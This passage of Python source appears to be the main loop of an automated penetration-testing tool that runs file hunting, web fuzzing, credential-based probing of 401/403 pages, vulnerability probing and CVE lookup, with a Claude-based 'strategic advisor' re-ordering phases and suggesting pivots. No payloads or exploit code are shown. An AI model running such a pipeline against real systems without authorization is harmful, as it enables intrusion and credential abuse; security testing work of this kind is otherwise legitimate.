            )
            _wst_designer  = _WstPathDesigner(
                trajectory={},
                suggestions=_wst_suggs,
                mode=args.mode,
                tracker=_wst_tracker,
            )
            _designed_queue = _wst_designer.to_phase_queue()
            # Keep only phases the operator enabled; preserve designer order
            phase_queue = [p for p in _designed_queue if p in _operator_queue]
            # Re-add any operator-enabled phases the designer dropped
            for _p in _operator_queue:
                if _p not in phase_queue:
                    phase_queue.append(_p)
            recorder.record_tier0(_wst_suggs, _wst_designer.explain(),
                                   _detected_os.os_tag, _detected_os.confidence)
            console.print(
                f"[dim cyan][WST] Tier 0 path designed: "
                f"OS={_detected_os.os_tag}({_detected_os.confidence})  "
                f"queue={phase_queue}[/dim cyan]"
            )
        except Exception as _wst_err:
            console.print(f"[yellow][WST] Path Designer skipped: {_wst_err}[/yellow]")
            phase_queue = _operator_queue
    else:
        phase_queue = _operator_queue

    # ── Claude strategic advisor: re-sequence based on recon findings ──────
    _adv_meta: dict = {"called": False, "attack_surface_summary": "", "pivots": []}
    if not args.no_artifacts and _ANTHROPIC_KEY_PRESENT and phase_queue:
        _phase_sleep(delay, "strategic advisor")
        _pre_adv_queue = list(phase_queue)
        phase_queue, _adv_meta = claude_strategic_advisor(findings, cred_results, phase_queue)
        if _adv_meta["called"]:
            recorder.record_advisor(
                _pre_adv_queue, phase_queue,
                _adv_meta["attack_surface_summary"], _adv_meta["pivots"],
            )

    recorder.scan_start(phase_queue)

    console.print(
        f"\n[bold][+] Phase queue: [cyan]{'  →  '.join(phase_queue)}[/cyan][/bold]\n"
    )

    # ══════════════════════════════════════════════════════════════════════
    # DYNAMIC PHASE EXECUTION LOOP  (live-adapted between phases)
    # ══════════════════════════════════════════════════════════════════════
    _executed: set[str] = set()
    _queue_idx = 0
    vulnreport_top10: list[dict] = []
    fuzz_findings: list[dict] = []      # populated by webfuzz; 401/403 entries passed to postauth

    while _queue_idx < len(phase_queue):
        phase = phase_queue[_queue_idx]
        _queue_idx += 1

        if phase in _executed:
            continue       # guard against duplicate insertions
        _executed.add(phase)

        _phase_sleep(delay, phase)
        _snap = len(findings)
        recorder.phase_start(phase)

        # ── filehunt ──────────────────────────────────────────────────────
        if phase == "filehunt":
            if not phase_done(sdir, "filehunt"):
                hvf_findings = run_hvf_scan(target, args.mode, sdir, nmap, cred_results)
                (Path(sdir) / "hvf_findings.json").write_text(
                    json.dumps(hvf_findings, indent=2)
                )
                mark_done(sdir, "filehunt")
            else:
                console.print(
                    "[dim][~] filehunt phase already complete — loading cached results[/dim]"
                )
                try:
                    hvf_findings = json.loads(
                        (Path(sdir) / "hvf_findings.json").read_text()
                    )
                except Exception:
                    hvf_findings = [f for f in findings if f.get("src") == "dc_hvf"]
            print_hvf_report(hvf_findings, target)
            findings.extend(f for f in hvf_findings if f not in findings)

        # ── webfuzz ───────────────────────────────────────────────────────
        elif phase == "webfuzz":
            if not phase_done(sdir, "webfuzz"):
                fuzz_findings = run_web_fuzz(
                    target, args.mode, sdir, nmap,
                    wordlist=getattr(args, "wordlist", None),
                )
                (Path(sdir) / "fuzz_findings.json").write_text(
                    json.dumps(fuzz_findings, indent=2)
                )
                mark_done(sdir, "webfuzz")
            else:
                console.print(
                    "[dim][~] webfuzz phase already complete — loading cached results[/dim]"
                )
                try:
                    fuzz_findings = json.loads(
                        (Path(sdir) / "fuzz_findings.json").read_text()
                    )
                except Exception:
                    fuzz_findings = []
            findings.extend(fuzz_findings)

        # ── postauth ──────────────────────────────────────────────────────
        elif phase == "postauth":
            if not cred_results:
                console.print("[dim][~] No credentials — skipping post-auth[/dim]")
            elif not phase_done(sdir, "postauth"):
                # Gap 5: collect 401/403 URLs discovered by webfuzz for cred probing
                _restricted = [
                    f["fuzz_url"] for f in fuzz_findings
                    if f.get("fuzz_status") in ("401", "403")
                ]
                postauth_findings = run_post_auth_enum(
                    target, cred_results, sdir, restricted_urls=_restricted or None
                )
                (Path(sdir) / "postauth_findings.json").write_text(
                    json.dumps(postauth_findings, indent=2)
                )
                mark_done(sdir, "postauth")
                findings.extend(postauth_findings)
                _pa_derived = _extract_postauth_findings(postauth_findings)
                if _pa_derived:
                    findings.extend(_pa_derived)
                    console.print(
                        f"[dim cyan][WST] {len(_pa_derived)} secondary findings "
                        f"derived from post-auth data[/dim cyan]"
                    )
            else:
                console.print(
                    "[dim][~] postauth phase already complete — loading cached results[/dim]"
                )
                try:
                    postauth_findings = json.loads(
                        (Path(sdir) / "postauth_findings.json").read_text()
                    )
                except Exception:
                    postauth_findings = []
                findings.extend(postauth_findings)
                _pa_derived = _extract_postauth_findings(postauth_findings)
                if _pa_derived:
                    findings.extend(_pa_derived)

        # ── vulnprobe ─────────────────────────────────────────────────────
        elif phase == "vulnprobe":
            if not phase_done(sdir, "vulnprobe"):
                probe_findings = run_vuln_probe(target, args.mode, sdir, findings)
                (Path(sdir) / "probe_findings.json").write_text(
                    json.dumps(probe_findings, indent=2)
                )
                mark_done(sdir, "vulnprobe")
            else:
                console.print(
                    "[dim][~] vulnprobe phase already complete — loading cached results[/dim]"
                )
                try:
                    probe_findings = json.loads(
                        (Path(sdir) / "probe_findings.json").read_text()
                    )
                except Exception:
                    probe_findings = []
            findings.extend(probe_findings)

        # ── vulnreport ────────────────────────────────────────────────────
        elif phase == "vulnreport":
            vulnreport_top10 = run_vulnreport(findings, target, getattr(args, "vuln_output", None))
            for v in vulnreport_top10:
                findings.append({
                    "src":          "dc_vulnreport",
                    "cve_id":       v.get("cve_id"),
                    "baseSeverity": v.get("baseSeverity"),
                    "baseScore":    v.get("baseScore"),
                    "source":       v.get("source"),
                    "desc":         v.get("desc"),
                })

        # ── artifacts ─────────────────────────────────────────────────────
        elif phase == "artifacts":
            # Gap 6: cache guard — if Claude API fails mid-batch, results survive resume
            if not phase_done(sdir, "artifacts"):
                # Prefer the pre-ranked top-10 CVE IDs from vulnreport; fall back to raw findings
                if vulnreport_top10:
                    cve_ids = [v["cve_id"] for v in vulnreport_top10 if v.get("cve_id")]
                else:
                    cve_ids = list({f["cve"] for f in findings if "cve" in f})
                artifact_findings = run_artifacts_lookup(cve_ids)
                (Path(sdir) / "artifact_findings.json").write_text(
                    json.dumps(artifact_findings, indent=2)
                )
                mark_done(sdir, "artifacts")
            else:
                console.print(
                    "[dim][~] artifacts phase already complete — loading cached results[/dim]"
                )
                try:
                    artifact_findings = json.loads(
                        (Path(sdir) / "artifact_findings.json").read_text()
                    )
                except Exception:
                    artifact_findings = []
            findings.extend(artifact_findings)

        recorder.phase_end(phase, findings[_snap:])


        # ── live adapt: re-evaluate remaining queue after every phase ──────
        remaining = phase_queue[_queue_idx:]
        if remaining:
            adapted = live_adapt_rules(findings, cred_results, remaining)
            if adapted != remaining:
                recorder.record_adapt(
                    phase, remaining, adapted,
                    _detect_fired_rules(findings, cred_results, remaining, adapted),
                )
                phase_queue = phase_queue[:_queue_idx] + adapted

    # ══════════════════════════════════════════════════════════════════════
    # SAVE REPORTS
    # ══════════════════════════════════════════════════════════════════════
    recorder.scan_end(len(findings), phase_queue)

    report_path = save_report(findings, target, sdir)
    print_final_summary(findings, target, sdir)

    # ── Tier 0: record engagement outcomes for future scoring ─────────────
    if _WST_AVAILABLE:
        try:
            _wst_tracker.flush_session(
                target=target,
                phase_queue_executed=list(_executed),
                findings=findings,
            )
        except Exception:
            pass  # never crash the scan over tracking

    # This consolidates online weight nudges and persists to KnowledgeBase.

    _traj_path = str(Path(sdir) / "trajectory.json")
    _narr_path = generate_human_narrative(sdir, target, _traj_path)
    compute_audit_diff(sdir, target, _traj_path, _narr_path)

    console.print(
        f"\n[bold green]✓ dig_champs complete.[/bold green]  "
        f"[dim]JSON: {report_path}  |  Session: {sdir}[/dim]\n"
    )


if __name__ == "__main__":
    main()
